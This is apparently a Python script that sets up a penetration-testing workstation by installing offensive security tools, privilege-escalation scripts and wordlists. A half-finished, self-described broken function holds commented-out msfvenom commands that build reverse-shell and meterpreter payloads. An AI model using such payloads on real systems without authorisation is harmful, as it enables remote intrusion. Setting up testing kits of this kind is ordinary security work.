import os,re,time
from simple_term_menu import TerminalMenu
from termcolor import colored

#TODO: Alphabetize
APT_PACKAGES = [
	'apt-transport-https',
    'seclists',
    'golang-go',
    'gobuster',
    'metasploit-framework',
    'crackmapexec',
    'snmpcheck','enum4linux',
    'smbmap',
    'wfuzz',
    'sublime-text',
    'yersinia',
    'bloodhound',
    'subfinder',
    'tilix'
]
#TODO: Alphabetize
GITHUBS = [
    'https://github.com/0v3rride/Enum4LinuxPy.git',
    'https://github.com/RUB-NDS/PRET.git',
    'https://github.com/nccgroup/vlan-hopping.git',
    'https://github.com/HackPlayers/evil-winrm.git',
    'https://github.com/SecureAuthCorp/Impacket.git',
    'https://github.com/21y4d/nmapAutomator.git',
    'https://github.com/vulnersCom/nmap-vulners.git',
    'https://github.com/rebootuser/LinEnum.git'
]
#TODO: Actually grab these
#TODO: REGEX out the release date so we always swipe the newest editions
#TODO: If these scripts already exist, wipe them out and re-obtain
PEAS = [
	'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh',
	'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEAS.bat',
	'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEASany.exe'
]

PYPI_PACKAGES = [
	'one-lin3r',
	'ptftpd',
	'bloodhound',
	'colorama',
	'pysnmp']

# ---- Begin Function declarations -----

def go_install():
	if os.path.exists(f'/usr/local/go'):
		print(colored('GO already is installed at /usr/local/go, continuing...', 'green'))
	else:
		os.system('wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz')
		os.system('sudo rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz')
		os.system('export PATH=$PATH:/usr/local/go/bin') # This currently isn't working properly
		os.system('source $HOME/.profile && go version')
		print('Attempting to utilize GO to grab & install assetfinder now...\n')
		os.system('go get -u github.com/tomnomnom/assetfinder')
		print(colored('If we have gotten to here, this is a good sign....', 'yellow'))

def msfdb_init():
	#TODO: Check and make sure the msfdb is actually up and running
	os.system('sudo systemctl start postgresql')
	os.system('systemctl status postgresql')
	os.system('sudo msfdb init')
	print("MSF Database Initialized")

def neo4j_init():
	#TODO: Grab the port/service information and present to the user
	os.system('sudo mkdir -p /usr/share/neo4j/logs')
	os.system('sudo touch /usr/share/neo4j/logs/neo4j.log')
	os.system('sudo neo4j start')
	print("Neo4j service initialized")

#TODO: Do this better
#TODO: Fix it so that the proper lower-level user owns the files
def peas_download():
	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh'
	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEAS.bat'
	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEASany.exe'
	# For the time being - just scrub the PEAS directory and re-obtain
	if os.path.exists("/opt/PEAS"):
		#Lol, risky
		os.system("rm /opt/PEAS/*")
	else:
		os.mkdir("/opt/PEAS")
		os.system(f"wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x linpeas.sh")
		os.system(f"wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
		os.system(f"wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")


def shell_creation():
	#ip_addr = os.popen('ip addr show eth0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
	#listen_port = 6969
	print(f"Interface address is: {ip_addr}")
	print(f"Port being used for shells is {listen_port}")
	print("						   Nice")
	#os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
	#os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
	#os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f exe > /tmp/test.exe')
	print("Did I work? doubtful!")

#TODO: Go through the installed tools and make them dynamically executable
#Search through tools and see if there's any requirements.txt - if there is - install them.
# sudo ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x /opt/nmapAutomator/nmapAutomator.sh
# sudo ln -s /opt/LinEnum.sh /usr/local/bin/'
# sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin
def tool_install():

	def is_repo_installed(repo_url):
		if a_match := re.match(r"https://.+/(.+)\.git", repo_url):
			return os.path.exists(f"/opt/{a_match.group(1)}")
		else:
			print(colored(f'INVALID URL: {repo_url}', 'red'))
			# Returning True here because if the url isn't valid, then we definitely don't want to try installing
			return True

	for git_url in GITHUBS:
		print(f"Checking for local install of: {git_url}")
		if is_repo_installed(git_url):
			print(colored(f"Found in /opt continuing...\n"))
		else:
			os.system(f"git clone {git_url}")
			print(colored("Repo cloned! Moving on...\n", "green"))
			#return()

	# begin installing pypi & apt packages
	for pkg in APT_PACKAGES:
		os.system(f'sudo apt install {pkg} -y 1>/dev/null')
		os.system('sudo apt install -y 1>/dev/null')
		print(colored(f'APT {pkg} successfully installed by script', "green"))
	for pkg in PYPI_PACKAGES:
		os.system(f'pip3 install {pkg} 1>/dev/null')
		print(colored(f'PYPI {pkg} successfully installed by script', "green"))
	peas_download()
	print("tool_install() Completed")
	return True


def sublime_download():
	sublime = 'deb https://download.sublimetext.com/ apt/stable/'
	os.system('wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
				| sudo apt-key add -')
	os.system(f'echo {sublime} | sudo tee /etc/apt/sources.list.d/sublime-text.list')

def system_update():
	print(colored("Beginning System updates, please wait...", 'blue'))
	os.system('sudo apt-get install apt-transport-https') # Doing this first to ensure sublime_download() wont cause an error
	sublime_download()
	tool_install()
	tool_update()
	os.system('sudo apt install python3-pip -y')
	os.system('sudo apt update -y')
	os.system('sudo apt upgrade -y')
	os.system('sudo apt autoremove -y')

	print(colored("Finished SYSTEM setup", 'green'))
	return()

def terminal_selection():
	""" This is what is used within main() to control the function flow """
	main_menu_title = "Automated Kit Buildout Script, Select ALL, TOOLS, SHELL or TEST\n"
	main_menu_cursor = "-> "

	options = ["ALL", "TOOLS", "SHELL (BROKEN)", "TEST"]
	# begin TUI Custom configuration(s)
	terminal_menu = TerminalMenu(
		options,
		title=main_menu_title,
		menu_cursor=main_menu_cursor)
	menu_entry_index = terminal_menu.show()
	user_selection = {options[menu_entry_index]}
	# Choice menu
	if menu_entry_index == 0:
		print(("Match Successful on ALL"))
		system_update()
		msfdb_init()
		neo4j_init()
		#software_update()
	elif menu_entry_index == 1:
		print("Match successful on TOOLS")
		#software_update()
		tool_install()
		tool_update()
		msfdb_init()
		neo4j_init()
		jon()
		#go_install()
	elif menu_entry_index == 2:
		print("Match successful on SHELL")
		shell_creation()
	elif menu_entry_index == 3:
		test()
	else:
		print("Match failed.")

def test():
	peas_download()

def jon():
	print("Doing some work, here's a nice portrait, circa 2022 \n")
	print("""\
   -    \\O
  -     /\\  
 -   __/\\ `	
    `    \\, (o)
^^^^^^^^^^^`^^^^^^^^
Ol' Jon, kickin' them rocks again	\n""")

def tool_update():
	def nmap_update():
		print("Updating nmap script database\n")
		os.system('sudo nmap --script-updatedb 1>/dev/null')
		print(colored('nmap script database updated \n', 'green'))

	def rockyou():
		print("Checking if rockyou has been unzipped...")
		if os.path.isfile('/usr/share/wordlists/rockyou.txt.gz'):
			print("It hasn't been decompressed - decompressing now...\n")
			os.system('sudo gunzip /usr/share/wordlists/rockyou.txt.gz')
		else:
			print(colored("rockyou has already been unzipped \n", 'green'))
			print(colored("Software & Tool updates have been completed!", 'green'))
	print('Updating searchsploit DB....\n')
	os.system('sudo searchsploit -u ')
	print(colored("Finished searchsploit update", 'green'))
	print("Updating locate DB...\n")
	os.system('sudo updatedb')
	print(colored("Finished locate DB update \n", 'green'))
	nmap_update()
	rockyou()
	return True
